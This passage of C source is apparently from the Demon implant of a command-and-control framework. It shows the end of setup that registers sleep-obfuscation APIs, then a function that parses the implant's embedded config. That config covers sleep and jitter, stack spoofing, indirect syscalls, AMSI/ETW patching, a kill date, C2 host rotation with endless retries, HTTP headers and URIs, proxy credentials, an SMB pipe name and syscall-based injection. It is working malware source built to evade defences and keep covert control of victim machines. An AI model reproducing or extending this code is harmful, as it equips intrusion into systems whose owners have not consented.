        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtContinue );
        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtSetContextThread );
        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtGetContextThread );
        CfgAddressAdd( Instance.Modules.Advapi32, Instance.Win32.SystemFunction032 );

        /* ekko sleep obf */
        CfgAddressAdd( Instance.Modules.Kernel32, Instance.Win32.WaitForSingleObjectEx );
        CfgAddressAdd( Instance.Modules.Kernel32, Instance.Win32.VirtualProtect );
        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtSetEvent );

        /* foliage sleep obf */
        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.NtTestAlert );
        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.NtWaitForSingleObject );
        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.NtProtectVirtualMemory );
        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.RtlExitUserThread );
    }

    PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
}

VOID DemonConfig()
{
    PARSER Parser = { 0 };
    PVOID  Buffer = NULL;
    ULONG  Temp   = 0;
    UINT32 Length = 0;
    DWORD  J      = 0;

    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )

    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );

    Instance.Config.Sleeping = ParserGetInt32( &Parser );
    Instance.Config.Jitter   = ParserGetInt32( &Parser );
    PRINTF( "Sleep: %d (%d%%)\n", Instance.Config.Sleeping, Instance.Config.Jitter )

    Instance.Config.Memory.Alloc   = ParserGetInt32( &Parser );
    Instance.Config.Memory.Execute = ParserGetInt32( &Parser );

    PRINTF(
        "[CONFIG] Memory: \n"
        " - Allocate: %d  \n"
        " - Execute : %d  \n",
        Instance.Config.Memory.Alloc,
        Instance.Config.Memory.Execute
    )

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Process.Spawn64, Buffer, Length );

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );

    PRINTF(
        "[CONFIG] Spawn: \n"
        " - [x64] => %ls  \n"
        " - [x86] => %ls  \n",
        Instance.Config.Process.Spawn64,
        Instance.Config.Process.Spawn86
    )

    Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
    Instance.Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
    Instance.Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
    Instance.Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
    Instance.Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
    Instance.Config.Implant.DownloadChunkSize  = 0x80000; /* 512k by default. */

    PRINTF(
        "[CONFIG] Sleep Obfuscation: \n"
        " - Technique: %d \n"
        " - Stack Dup: %s \n"
        "[CONFIG] ProxyLoading: %d\n"
        "[CONFIG] SysIndirect : %s\n"
        "[CONFIG] AmsiEtwPatch: %d\n",
        Instance.Config.Implant.SleepMaskTechnique,
        Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE",
        Instance.Config.Implant.ProxyLoading,
        Instance.Config.Implant.SysIndirect ? "TRUE" : "FALSE",
        Instance.Config.Implant.AmsiEtwPatch
    )

#ifdef TRANSPORT_HTTP
    Instance.Config.Transport.KillDate       = ParserGetInt64( &Parser );
    PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
    // check if the kill date has already passed
    if ( Instance.Config.Transport.KillDate && GetSystemFileTime() >= Instance.Config.Transport.KillDate )
    {
        // refuse to run
        // TODO: exit process?
        Instance.Win32.RtlExitUserThread( 0 );
    }
    Instance.Config.Transport.WorkingHours   = ParserGetInt32( &Parser );

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.Method = NtHeapAlloc( Length + sizeof( WCHAR ) );
    MemCopy( Instance.Config.Transport.Method, Buffer, Length );

    Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
    Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
                                                    * TODO: add this to the yaotl language and listener GUI */
    Instance.Config.Transport.Hosts = NULL;
    Instance.Config.Transport.Host  = NULL;

    /* J contains our Hosts counter */
    J = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
    for ( int i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Temp   = ParserGetInt32( &Parser );

        PRINTF( " - %ls:%ld\n", Buffer, Temp )

        /* if our host address is longer than 0 then lets use it. */
        if ( Length > 0 ) {
            /* Add parse host data to our linked list */
            HostAdd( Buffer, Length, Temp );
        }
    }
    PRINTF( "Hosts added => %d\n", HostCount() )

    /* Get Host data based on our host rotation strategy */
    Instance.Config.Transport.Host = HostRotation( Instance.Config.Transport.HostRotation );
    PRINTF( "Host going to be used is => %ls:%ld\n", Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port )

    // Listener Secure (SSL)
    Instance.Config.Transport.Secure = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Secure: %s\n", Instance.Config.Transport.Secure ? "TRUE" : "FALSE" );

    // UserAgent
    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.UserAgent = NtHeapAlloc( Length + sizeof( WCHAR ) );
    MemCopy( Instance.Config.Transport.UserAgent, Buffer, Length );
    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance.Config.Transport.UserAgent );

    // Headers
    J = ParserGetInt32( &Parser );
    Instance.Config.Transport.Headers = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Headers [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Headers[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( Instance.Config.Transport.Headers[ i ], 0, Length );
        MemCopy( Instance.Config.Transport.Headers[ i ], Buffer, Length );
#ifdef DEBUG
        PRINTF( "  - %ls\n", Instance.Config.Transport.Headers[ i ] );
#endif
    }
    Instance.Config.Transport.Headers[ J + 1 ] = NULL;

    // Uris
    J = ParserGetInt32( &Parser );
    Instance.Config.Transport.Uris = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Uris [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Uris[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( Instance.Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
        MemCopy( Instance.Config.Transport.Uris[ i ], Buffer, Length );
#ifdef DEBUG
        PRINTF( "  - %ls\n", Instance.Config.Transport.Uris[ i ] );
#endif
    }
    Instance.Config.Transport.Uris[ J + 1 ] = NULL;

    // check if proxy connection is enabled
    Instance.Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        PUTS( "[CONFIG] [PROXY] Enabled" );
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Proxy.Url = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemCopy( Instance.Config.Transport.Proxy.Url, Buffer, Length );
        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance.Config.Transport.Proxy.Url );

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance.Config.Transport.Proxy.Username = NtHeapAlloc( Length );
            MemCopy( Instance.Config.Transport.Proxy.Username, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance.Config.Transport.Proxy.Username );
        }
        else
            Instance.Config.Transport.Proxy.Username = NULL;

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance.Config.Transport.Proxy.Password = NtHeapAlloc( Length );
            MemCopy( Instance.Config.Transport.Proxy.Password, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance.Config.Transport.Proxy.Password );
        }
        else
            Instance.Config.Transport.Proxy.Password = NULL;
    }
    else
    {
        PUTS( "[CONFIG] [PROXY] Disabled" );
    }
#endif

#ifdef TRANSPORT_SMB

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.Name = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Transport.Name, Buffer, Length );

    PRINTF( "[CONFIG] PipeName: %ls\n", Instance.Config.Transport.Name );

    Instance.Config.Transport.KillDate = ParserGetInt64( &Parser );
    PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
    // check if the kill date has already passed
    if ( Instance.Config.Transport.KillDate && GetSystemFileTime() >= Instance.Config.Transport.KillDate )
    {
        // refuse to run
        // TODO: exit process?
        Instance.Win32.RtlExitUserThread(0);
    }
    Instance.Config.Transport.WorkingHours = ParserGetInt32( &Parser );
#endif

    Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
    Instance.Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;

    ParserDestroy( &Parser );
}
